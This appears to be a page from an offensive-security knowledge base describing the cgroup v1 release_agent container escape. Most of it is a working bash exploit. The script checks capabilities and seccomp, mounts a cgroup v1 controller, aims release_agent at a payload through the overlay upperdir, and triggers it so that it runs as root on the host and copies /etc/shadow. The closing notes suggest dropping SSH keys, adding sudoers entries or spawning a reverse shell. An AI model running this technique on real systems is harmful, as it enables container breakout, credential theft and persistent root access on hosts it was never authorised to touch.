---
title: "cgroups release_agent: running a host program through a writable handler"
description: "The cgroup v1 release_agent is a path the kernel executes as root in the host namespaces when the last task leaves a cgroup marked notify_on_release. A container that can mount a cgroup v1 hierarchy and write release_agent coerces the kernel into running an attacker program on the host, a reliable escape needing only CAP_SYS_ADMIN and a cgroup v1 controller."
keywords:
  - release_agent
  - notify_on_release
  - cgroup v1
  - cap_sys_admin
  - container escape
---

# cgroups release_agent

The `release_agent` is a cgroup v1 feature: a program path that the kernel runs, as a fresh root process in the host's init namespaces, whenever the last task exits a cgroup that has `notify_on_release` enabled. Nothing about this execution is confined to the container, because the kernel runs the agent from the host's filesystem and namespace context. A container that can mount a cgroup v1 controller and write the `release_agent` and `notify_on_release` files therefore has a direct, exploit-free path to host code execution.

Preconditions: `CAP_SYS_ADMIN` (to mount the cgroup filesystem), a callable `mount` syscall (not blocked by seccomp), and a cgroup v1 hierarchy on the host.

```bash
grep CapEff /proc/self/status          # CAP_SYS_ADMIN present
grep Seccomp /proc/self/status         # 0 or a filter that permits mount
ls /sys/fs/cgroup/*/release_agent 2>/dev/null   # v1 hierarchies exist
mount | grep -q cgroup2 && echo "cgroup v2 present (release_agent may be absent)"
```

## The full technique

```bash
# 1. Mount a cgroup v1 controller we control. "rdma" is chosen because it is
#    rarely already mounted; any v1 controller works.
mkdir /tmp/cg && mount -t cgroup -o rdma cgroup /tmp/cg
mkdir /tmp/cg/x

# 2. Mark the child cgroup so the kernel fires the agent when it empties
echo 1 > /tmp/cg/x/notify_on_release

# 3. The agent runs in the HOST filesystem view. Find where this container's
#    root maps on the host (overlay upperdir) so the payload path resolves there.
host=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)

# 4. Point release_agent at a payload under that host-visible path
echo "$host/x.sh" > /tmp/cg/release_agent

# 5. Write the payload (runs as root on the host)
cat > /x.sh <<SH
#!/bin/sh
id > $host/out 2>&1
cat /etc/shadow >> $host/out 2>&1
SH
chmod +x /x.sh

# 6. Trigger: put a short-lived task into the child cgroup, let it exit
sh -c "echo \$\$ > /tmp/cg/x/cgroup.procs"
sleep 1; cat /out
```

The `upperdir` step in 3 and 4 is the crux. The kernel resolves `release_agent` in the host root filesystem, so a payload written only at `/x.sh` inside the container would not be found; writing the agent path as the overlay `upperdir` location makes the same inode reachable from the host side, and reading it from `/proc/self/mountinfo` keeps the technique portable.

## Variants and failure modes

- **cgroup v2 only**: a pure cgroup-v2 host has no `release_agent` file and the `mount -t cgroup` in step 1 has no v1 controller to bind; the technique does not apply. Confirm with `mount | grep cgroup2` and the absence of `release_agent`. Fall back to a kernel module or disk mount.
- **seccomp blocks mount**: the default Docker seccomp profile blocks `mount`, so this route needs `seccomp=unconfined` alongside the capability; see [Unconfined seccomp or AppArmor](unconfined-seccomp-or-apparmor.md).
- **no CAP_SYS_ADMIN**: without it the mount fails; this is why the technique is listed under both [CAP_SYS_ADMIN](capability-abuse/cap-sys-admin.md) and [Privileged flag](privileged-flag.md).

## Exploitation notes

- The payload runs once, briefly, as root in the host init namespace: use it to drop an SSH key, add a sudoers entry, or spawn a reverse shell rather than trying to hold an interactive session through the agent.
- Output must be written to a host-visible path (the same `upperdir`) to read it back from inside the container, as the example does with `out`.

## References

- [man 7 cgroups: notify_on_release and release_agent](https://man7.org/linux/man-pages/man7/cgroups.7.html)
- [Trail of Bits: Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [Unit 42: release_agent container escape analysis](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/)
